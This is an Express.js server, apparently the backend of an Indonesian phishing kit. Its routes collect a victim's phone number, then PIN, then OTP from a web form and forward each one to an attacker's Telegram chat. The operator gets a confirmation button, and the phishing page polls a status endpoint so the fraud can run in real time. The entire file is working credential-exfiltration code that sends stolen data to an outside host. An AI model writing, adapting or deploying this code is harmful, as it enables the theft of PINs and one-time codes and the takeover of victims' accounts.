const express = require("express");
const axios = require("axios");
const path = require("path");
const app = express();

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

const statusData = {};

app.use(express.json());
app.use(
    express.urlencoded({
        extended:true
    })
);

app.use(
    express.static(
        path.join(__dirname)
    )
);

app.get("/", (req,res)=>{
    
    res.send("SERVER HIDUP");
    
});

/* ROUTE */
app.post("/nmrx", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx
            
        } = req.body;

        if(
            !nmrx
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>  : <b>${nmrx}</b>
⌬<i>  POX . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/pix", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix
            
        } = req.body;

        if(
            !nmrx ||
            !pix
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
⌬<i>  OXT . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        statusData[nmrx] = "pending";
        /* PESAN TELEGRAM */
        const text = `
🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
              × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{

    chat_id:
    CHAT_ID,

    text:
    text,

    parse_mode:
    "HTML",

    reply_markup:{
        inline_keyboard:[
            [
                {
                    text:"✅ KONFIRMASI",
                    callback_data:`confirm_${nmrx}`
                }
            ]
        ]
    }

}
);

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

app.get("/status/:nmrx", (req,res)=>{

    const nmrx =
    req.params.nmrx;

    res.json({
        success:true,
        status: statusData[nmrx] || "pending"
    });

});

let lastUpdateId = 0;

setInterval(async()=>{

    try{

        const response = await axios.get(
            `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`,
            {
                params:{
                    offset:lastUpdateId + 1,
                    timeout:1
                }
            }
        );

        const updates =
        response.data.result;

        for(const update of updates){

            lastUpdateId =
            update.update_id;

            if(!update.callback_query) continue;

            const callback =
            update.callback_query;

            const data =
            callback.data;

            if(data.startsWith("confirm_")){

                const nmrx =
                data.replace("confirm_","");

                statusData[nmrx] =
                "confirmed";

                await axios.post(
                    `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
                    {
                        callback_query_id:callback.id,
                        text:"Berhasil dikonfirmasi"
                    }
                );

            }

        }

    }catch(error){

        console.log(
            "Polling error:",
            error.message
        );

    }

},2000);

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
